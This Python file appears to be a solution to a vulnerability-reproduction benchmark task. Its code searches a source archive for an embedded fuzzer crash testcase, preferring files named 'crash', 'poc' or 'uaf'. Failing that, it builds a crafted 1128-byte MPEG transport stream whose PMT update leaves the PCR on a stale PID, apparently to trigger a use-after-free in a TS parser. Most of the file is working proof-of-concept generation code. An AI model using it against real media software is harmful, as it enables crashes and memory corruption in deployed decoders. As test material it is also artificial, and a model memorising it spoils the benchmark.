import os
import tarfile
import gzip
import lzma
import zipfile
import io
import struct
from typing import Optional, Tuple, List


def _mpeg2_crc32_table():
    poly = 0x04C11DB7
    table = []
    for i in range(256):
        crc = i << 24
        for _ in range(8):
            if crc & 0x80000000:
                crc = ((crc << 1) & 0xFFFFFFFF) ^ poly
            else:
                crc = (crc << 1) & 0xFFFFFFFF
        table.append(crc)
    return table


_CRC_TABLE = _mpeg2_crc32_table()


def mpeg2_crc32(data: bytes) -> int:
    crc = 0xFFFFFFFF
    for b in data:
        crc = ((_CRC_TABLE[((crc >> 24) ^ b) & 0xFF] ^ ((crc << 8) & 0xFFFFFFFF)) & 0xFFFFFFFF)
    return crc & 0xFFFFFFFF


def is_ts(data: bytes) -> bool:
    n = len(data)
    if n < 188 or (n % 188) != 0:
        return False
    for i in range(0, n, 188):
        if data[i] != 0x47:
            return False
    return True


def _maybe_decompress(data: bytes) -> Optional[bytes]:
    if len(data) >= 2 and data[0] == 0x1F and data[1] == 0x8B:
        try:
            return gzip.decompress(data)
        except Exception:
            return None
    if len(data) >= 6 and data[:6] == b"\xFD7zXZ\x00":
        try:
            return lzma.decompress(data)
        except Exception:
            return None
    if len(data) >= 4 and data[:4] == b"PK\x03\x04":
        try:
            with zipfile.ZipFile(io.BytesIO(data)) as zf:
                names = zf.namelist()
                if not names:
                    return None
                best = None
                for nm in names:
                    if nm.endswith("/"):
                        continue
                    try:
                        b = zf.read(nm)
                    except Exception:
                        continue
                    if best is None or len(b) < len(best):
                        best = b
                return best
        except Exception:
            return None
    return None


def _section_pat(pmt_pid: int = 0x100, tsid: int = 1, version: int = 0, program_number: int = 1) -> bytes:
    section_length = 13
    header = bytearray()
    header.append(0x00)
    header.append(0xB0 | ((section_length >> 8) & 0x0F))
    header.append(section_length & 0xFF)
    header += struct.pack(">H", tsid & 0xFFFF)
    header.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    header.append(0x00)
    header.append(0x00)
    header += struct.pack(">H", program_number & 0xFFFF)
    header.append(0xE0 | ((pmt_pid >> 8) & 0x1F))
    header.append(pmt_pid & 0xFF)
    crc = mpeg2_crc32(bytes(header))
    header += struct.pack(">I", crc)
    return bytes(header)


def _section_pmt(
    pcr_pid: int,
    es_pid: int,
    version: int,
    pmt_program_number: int = 1,
    stream_type: int = 0x1B,
) -> bytes:
    section_length = 18
    b = bytearray()
    b.append(0x02)
    b.append(0xB0 | ((section_length >> 8) & 0x0F))
    b.append(section_length & 0xFF)
    b += struct.pack(">H", pmt_program_number & 0xFFFF)
    b.append(0xC0 | ((version & 0x1F) << 1) | 0x01)
    b.append(0x00)
    b.append(0x00)
    b.append(0xE0 | ((pcr_pid >> 8) & 0x1F))
    b.append(pcr_pid & 0xFF)
    b.append(0xF0)
    b.append(0x00)
    b.append(stream_type & 0xFF)
    b.append(0xE0 | ((es_pid >> 8) & 0x1F))
    b.append(es_pid & 0xFF)
    b.append(0xF0)
    b.append(0x00)
    crc = mpeg2_crc32(bytes(b))
    b += struct.pack(">I", crc)
    return bytes(b)


def _ts_packet(pid: int, pusi: int, cc: int, payload: bytes, adaptation: Optional[bytes] = None) -> bytes:
    pid &= 0x1FFF
    cc &= 0x0F
    if adaptation is None:
        afc = 1
        header = bytes([0x47, ((pusi & 1) << 6) | ((pid >> 8) & 0x1F), pid & 0xFF, (afc << 4) | cc])
        if len(payload) > 184:
            payload = payload[:184]
        packet = header + payload + (b"\xFF" * (188 - 4 - len(payload)))
        return packet
    else:
        afc = 3
        header = bytes([0x47, ((pusi & 1) << 6) | ((pid >> 8) & 0x1F), pid & 0xFF, (afc << 4) | cc])
        if len(adaptation) > 184:
            adaptation = adaptation[:184]
        max_payload = 184 - len(adaptation)
        if max_payload < 0:
            max_payload = 0
        if len(payload) > max_payload:
            payload = payload[:max_payload]
        packet = header + adaptation + payload + (b"\xFF" * (188 - 4 - len(adaptation) - len(payload)))
        return packet


def _build_fallback_poc() -> bytes:
    pid_pat = 0x0000
    pid_pmt = 0x0100
    pid_old = 0x0101
    pid_new = 0x0102

    pat = _section_pat(pmt_pid=pid_pmt, tsid=1, version=0, program_number=1)
    pmt_v0 = _section_pmt(pcr_pid=pid_old, es_pid=pid_old, version=0, pmt_program_number=1, stream_type=0x1B)

    # PMT update: ES moves to pid_new, but PCR PID stays on pid_old (now not listed as ES)
    pmt_v1 = _section_pmt(pcr_pid=pid_old, es_pid=pid_new, version=1, pmt_program_number=1, stream_type=0x1B)

    pkt0 = _ts_packet(pid_pat, 1, 0, b"\x00" + pat)
    pkt1 = _ts_packet(pid_pmt, 1, 0, b"\x00" + pmt_v0)

    pes_hdr = b"\x00\x00\x01\xE0\x00\x00\x80\x00\x00"
    pkt2_payload = pes_hdr + b"A" * 32
    pkt2 = _ts_packet(pid_old, 1, 0, pkt2_payload)

    pkt3 = _ts_packet(pid_pmt, 1, 1, b"\x00" + pmt_v1)

    # adaptation field with PCR flag set: length=7, flags=0x10, PCR=6 bytes
    adaptation = bytes([7, 0x10]) + b"\x00" * 6
    pkt4_payload = pes_hdr + b"B" * 16
    pkt4 = _ts_packet(pid_old, 1, 1, pkt4_payload, adaptation=adaptation)

    pkt5 = _ts_packet(pid_old, 0, 2, b"C" * 40)

    data = pkt0 + pkt1 + pkt2 + pkt3 + pkt4 + pkt5
    if len(data) != 1128:
        if len(data) < 1128:
            data += b"\xFF" * (1128 - len(data))
        else:
            data = data[:1128]
    return data


def _score_candidate(name: str, data: bytes) -> int:
    score = 0
    lname = name.lower()
    if is_ts(data):
        score += 1000
    if len(data) == 1128:
        score += 500
    if len(data) % 188 == 0:
        score += 50
    if any(k in lname for k in ("clusterfuzz", "testcase", "crash", "poc", "uaf", "oss-fuzz", "fuzz")):
        score += 200
    if any(k in lname for k in ("corpus", "seed", "seeds", "testcases", "repro")):
        score += 100
    if lname.endswith((".ts", ".m2ts", ".mts", ".bin", ".dat")):
        score += 50
    # prefer smaller if scores tie
    score -= min(len(data), 1_000_000) // 1000
    return score


def _find_embedded_poc_from_tar(src_path: str) -> Optional[bytes]:
    try:
        tf = tarfile.open(src_path, "r:*")
    except Exception:
        return None

    best: Optional[Tuple[int, bytes]] = None
    try:
        for m in tf.getmembers():
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > 5_000_000:
                continue
            name = m.name
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue

            cand_list = [data]
            dec = _maybe_decompress(data)
            if dec is not None and len(dec) <= 5_000_000:
                cand_list.append(dec)

            for cand in cand_list:
                if len(cand) < 4:
                    continue
                if not (len(cand) % 188 == 0 and cand[:1] == b"\x47"):
                    continue
                if not is_ts(cand):
                    continue
                sc = _score_candidate(name, cand)
                if best is None or sc > best[0]:
                    best = (sc, cand)

            if best is not None and best[0] >= 1600 and len(best[1]) == 1128:
                return best[1]
    finally:
        try:
            tf.close()
        except Exception:
            pass

    return best[1] if best is not None else None


def _find_embedded_poc_from_dir(src_dir: str) -> Optional[bytes]:
    best: Optional[Tuple[int, bytes]] = None
    for root, _, files in os.walk(src_dir):
        for fn in files:
            path = os.path.join(root, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 5_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            name = os.path.relpath(path, src_dir)
            cand_list = [data]
            dec = _maybe_decompress(data)
            if dec is not None and len(dec) <= 5_000_000:
                cand_list.append(dec)

            for cand in cand_list:
                if len(cand) < 4:
                    continue
                if not (len(cand) % 188 == 0 and cand[:1] == b"\x47"):
                    continue
                if not is_ts(cand):
                    continue
                sc = _score_candidate(name, cand)
                if best is None or sc > best[0]:
                    best = (sc, cand)
            if best is not None and best[0] >= 1600 and len(best[1]) == 1128:
                return best[1]
    return best[1] if best is not None else None


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = None
        if os.path.isdir(src_path):
            poc = _find_embedded_poc_from_dir(src_path)
        else:
            poc = _find_embedded_poc_from_tar(src_path)

        if poc is not None and len(poc) > 0:
            return poc

        return _build_fallback_poc()